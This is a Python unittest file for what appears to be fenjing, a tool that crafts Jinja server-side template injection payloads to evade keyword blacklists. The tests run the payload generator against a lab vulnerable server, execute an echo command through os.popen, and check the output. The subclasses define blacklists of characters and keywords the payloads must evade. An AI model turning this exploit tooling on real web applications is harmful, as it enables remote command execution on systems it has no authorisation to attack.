# pylint: skip-file
# flake8: noqa

import sys

sys.path.append("..")
from fenjing.form import get_form
from fenjing.requester import Requester
import unittest
import fenjing
from typing import Union
from fenjing.cracker import Cracker
from fenjing.submitter import FormSubmitter, HTTPResponse
from fenjing import const
import logging
import os

VULUNSERVER_ADDR = os.environ["VULUNSERVER_ADDR"]


class CrackerTestBase(unittest.TestCase):
    def setUp(self):
        super().setUp()
        self.blacklist = ["."]
        self.subm = FormSubmitter(
            url=VULUNSERVER_ADDR,
            form=get_form(action="/", inputs=["name"], method="GET"),
            target_field="name",
            requester=Requester(interval=0.01),
        )

    def test_waf(self):
        cracker = Cracker(self.subm)
        full_payload_gen = cracker.crack()
        self.assertIsNotNone(full_payload_gen)
        payload, _ = full_payload_gen.generate(
            const.OS_POPEN_READ,
            "echo 'cracked! @m wr!tI1111ng s()th' " + self.__class__.__name__,
        )
        self.assertIsNotNone(payload)
        resp = self.subm.submit(payload)
        assert resp is not None
        self.assertIn("cracked! @m wr!tI1111ng s()th", resp.text)


class CrackerTestHard(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.blacklist = [
            "config",
            "self",
            "g",
            "os",
            "class",
            "length",
            "mro",
            "base",
            "lipsum",
            # "os",
            # "import",
            # "x",
            # "url",
            # "globals",
            # "cycler",
            "[",
            '"',
            "'",
            "_",
            ".",
            "+",
            "~",
            "{{",
        ]


class CrackerTestWeird(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.blacklist = [
            "[",
            '"',
            "'",
            "_",
            ".",
            "+",
            "~",
            "{{",
        ]

